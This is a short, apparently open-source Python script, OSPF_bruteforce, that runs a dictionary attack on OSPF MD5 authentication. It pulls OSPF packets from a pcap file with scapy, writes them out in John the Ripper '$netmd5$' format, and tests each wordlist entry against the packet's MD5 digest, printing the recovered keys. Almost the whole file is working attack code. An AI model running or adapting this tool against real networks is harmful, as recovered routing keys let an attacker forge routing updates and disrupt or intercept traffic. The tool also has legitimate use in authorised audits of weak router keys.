#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This repository performs a dictionnary attack
#    against OSPF MD5 authentication using scapy. 
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This repository performs a dictionnary attack
against OSPF MD5 authentication using scapy. 
"""

__version__ = "0.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This repository performs a dictionnary attack
against OSPF MD5 authentication using scapy.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/OSPF_bruteforce"

copyright = """
OSPF_bruteforce  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = []

print(copyright)

from scapy_ospf import *
from hashlib import md5
from sys import argv, stderr, executable, exit

if len(argv) != 3:
    print("USAGES:", executable, argv[0], "[pcap/pcapng file path]", "[wordlist file path]", file=stderr)
    exit(1)

pkts = rdpcap(argv[1])

pkts = [raw(x[2]) for x in pkts if x[2].__class__.__name__.startswith('OSPF')]
pkts = [(pkt[:48], pkt[48:64]) for pkt in pkts]

with open('ospf_packets.hash.john', 'w') as file:
    [file.write(f'$netmd5${pkt[0].hex()}${pkt[1].hex()}\n') for pkt in pkts]

counter = 0

with open(argv[2], 'rb') as file:
    for password in file:
        password = password[:-1]
        for pkt in pkts:
            if md5(pkt[0] + password).digest() == pkt[1]:
                print('[+]', pkt[0].hex(), pkt[1].hex(), password.decode())
                counter += 1
                if counter == len(pkts):
                    print('[+] Done !')
